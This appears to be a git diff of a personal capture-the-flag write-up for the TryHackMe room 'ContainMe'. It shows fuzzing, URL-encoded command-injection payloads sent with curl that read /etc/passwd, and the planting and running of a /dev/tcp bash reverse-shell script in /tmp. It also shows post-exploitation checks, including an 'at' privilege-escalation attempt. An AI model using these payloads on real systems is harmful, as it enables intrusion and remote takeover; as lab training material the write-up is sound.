@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T23:40:20.327+02:00","dg-note-properties":{}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-03T15:16:43.325+02:00","dg-note-properties":{}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -123,6 +123,8 @@ Examining the header
 
 Using **DevTools** to explore further there are no API-calls or cookies being used for session management. 
 
+------------
+
 ### Fuzzing
 
 `ffuf -u http://10.113.154.153/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak -o ffuf.txt`
@@ -135,6 +137,8 @@ Using **DevTools** to explore further there are no API-calls or cookies being us
 * /server-info 
 * /.htpasswd 
 * /cgi-bin
+
+---------------
 
 Interesting endpoints are found via ffuf.
 
@@ -162,6 +166,8 @@ Perhaps the intended attack path is LFI or Command Injection. Lets try a payload
 ![](/img/user/Attachments/Ci-confirmed.png)
 
 Let's play around and see how far we can push it. 
+
+-------------
 
 ### Payload Crafting
 
@@ -192,6 +198,9 @@ curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;cat%20%2Fetc%2
 
 So far it seems that the only payload which works is the payload to read /etc/passwd. 
 
+---------
+
+
 Checking which tools are available
 
 Running this command: `which nc netcat ncat python3 python perl bash`
@@ -206,6 +215,9 @@ curl "http://10.112.132.114/index.php?path=/etc/passwd;which%20nc%20netcat%20nca
 So **python perl and bash** are available which explains why spawning a reverse shell with nc was unsuccessful. 
 
 It is possible to write the bash command to a **.sh** script and write it to the server using the **URL-encoding method** to achieve a reverse shell.
+
+------------
+
 #### Step 1: Write it to the Server
 
 **Decoded Payload**
@@ -221,6 +233,8 @@ curl "http://10.112.132.114/index.php?path=/tmp;echo%20'bash%20-i%20>%26%20/dev/
 
 ![](/img/user/Attachments/write-shell-script-to-server.png)
 
+-----------
+
 #### Step 2: Make it Executable
 
 **Decoded**
@@ -234,6 +248,8 @@ curl "http://10.112.132.114/index.php?path=/tmp;chmod%20+x%20/tmp/shell.sh"
 ```
 
 ![](/img/user/Attachments/make-sh-executable.png)
+
+---------
 
 #### Step 3: Execute it
 
@@ -266,22 +282,43 @@ Without it, many terminal features don't work properly — things like:
 - **Tab completion**
 - **Text editors** like `nano` or `vim` display incorrectly
 
+### Post-exploitation Enumeration
 
-**info.php**
+So given the title of the room **ContainMe** perhaps this system is in a container? Checking if there are any indications of a dockerfile or a docker environment. 
 
-![](/img/user/Attachments/info.php.png)
+```
+# Check if a .dockerenv file is present (might still be deleted manually)
+ls /.dockerenv
 
-Let's see if there are any exploits available for this particular PHP version
-![](/img/user/Attachments/php_vuln_version.png)
+# Checking control groups owns which process
+cat /proc/1/cgroup
 
+# Checking if www-data can take advantage of at
+echo "/bin/bash -p" | at now
 
-Using searchsploit to search for anything ....
-`searchsploit php 7.2`
+```
 
+* This absence of **.dockerenv** strongly suggest that it is not a docker environment.
+* for **cgroups** there is no docker hash visible. only `name=systemd:/init.scope` which suggests a normal system. systemd is running in its normal scope given that PID is set to 1 confirming it is on a linux host.
+* the **www-data** has been blocked from using the **at** job scheduler. 
 
+Considering running linpeas at this moment. 
 
+----------------
+Looking at running processes the commands which I ran earlier are shown.
+* The reverse shell establishment is seen on line 3
+* the stabilisation of the shell is seen on line 4
+* Executing the .sh script is seen on line 2
 
+`ps aux`
 
+![](/img/user/Attachments/psaux.png)
+
+The running processes which stand out 
+```
+root  214  /usr/bin/pyth
+root  1816 /usr/bin/pyth
+```
 
 
 
